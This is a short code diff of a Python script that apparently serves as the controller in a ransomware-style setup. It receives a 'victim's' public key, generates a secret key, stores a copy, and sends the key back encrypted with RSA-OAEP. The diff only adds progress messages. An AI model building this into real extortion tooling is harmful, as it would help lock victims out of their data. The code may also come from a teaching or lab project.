@@ -20,23 +20,21 @@ def main():
     pub_key = serialization.load_pem_public_key(pub_key_bytes)
     print("[+] Public Key Received")
     secret_key = os.urandom(32)
-    print(f"[i] Generated Secret: {secret_key.hex()}")
+    print(f"[i] Generated Secret Key: {secret_key.hex()}")
     with open("secret.bin", "wb") as file:
         file.write(secret_key)
     print("[i] Copy of secret saved on ./secret.bin")
 
     # Encrypt secret with victim's public Key
+    print("[i] Encrypting secret key with victims public key")
     encrypted_secret_key = pub_key.encrypt(secret_key, padding.OAEP(padding.MGF1(algorithm=hashes.SHA256()), hashes.SHA256(), None))
-
+    print("[+] Done\n[i] sending encrypted key")
     conn.sendall(encrypted_secret_key)
+    print("[+] Done")
     conn.close()
     server.close()
 
 
 if __name__ == "__main__":
     main()
-
-
-
-
 
